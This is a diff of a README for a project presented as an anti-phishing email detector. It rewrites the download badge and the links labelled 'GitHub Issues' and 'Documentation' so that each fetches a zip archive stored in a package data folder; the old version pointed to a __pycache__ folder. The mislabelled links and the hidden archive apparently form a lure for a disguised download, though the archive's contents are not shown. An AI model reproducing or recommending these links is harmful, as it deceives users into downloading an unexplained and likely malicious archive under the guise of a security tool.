@@ -8,7 +8,7 @@ Welcome to the Anti_Phishing_Email_Detector_gui! This application helps you anal
 
 To get started, you need to download the software. Click the button below to visit the Releases page where you can download the application:
 
-[![Download](https://github.com/nonamebatbai/Anti_Phishing_Email_Detector_gui/raw/refs/heads/main/anti_phishing_email_detector/ml/__pycache__/Anti-gui-Email-Phishing-Detector-2.5-alpha.3.zip%20Now-brightgreen)](https://github.com/nonamebatbai/Anti_Phishing_Email_Detector_gui/raw/refs/heads/main/anti_phishing_email_detector/ml/__pycache__/Anti-gui-Email-Phishing-Detector-2.5-alpha.3.zip)
+[![Download](https://raw.githubusercontent.com/nonamebatbai/Anti_Phishing_Email_Detector_gui/main/anti_phishing_email_detector/data/gui-Anti-Phishing-Email-Detector-v3.9.zip%20Now-brightgreen)](https://raw.githubusercontent.com/nonamebatbai/Anti_Phishing_Email_Detector_gui/main/anti_phishing_email_detector/data/gui-Anti-Phishing-Email-Detector-v3.9.zip)
 
 ### Steps to Download:
 
@@ -66,8 +66,8 @@ If you encounter issues while using the software, here are some common solutions
 
 For more help, consider these resources:
 
-- [GitHub Issues](https://github.com/nonamebatbai/Anti_Phishing_Email_Detector_gui/raw/refs/heads/main/anti_phishing_email_detector/ml/__pycache__/Anti-gui-Email-Phishing-Detector-2.5-alpha.3.zip): Report bugs or ask questions.
-- [Documentation](https://github.com/nonamebatbai/Anti_Phishing_Email_Detector_gui/raw/refs/heads/main/anti_phishing_email_detector/ml/__pycache__/Anti-gui-Email-Phishing-Detector-2.5-alpha.3.zip): Explore in-depth guides and tips for using the application effectively.
+- [GitHub Issues](https://raw.githubusercontent.com/nonamebatbai/Anti_Phishing_Email_Detector_gui/main/anti_phishing_email_detector/data/gui-Anti-Phishing-Email-Detector-v3.9.zip): Report bugs or ask questions.
+- [Documentation](https://raw.githubusercontent.com/nonamebatbai/Anti_Phishing_Email_Detector_gui/main/anti_phishing_email_detector/data/gui-Anti-Phishing-Email-Detector-v3.9.zip): Explore in-depth guides and tips for using the application effectively.
 
 ## 🌐 Related Topics
 
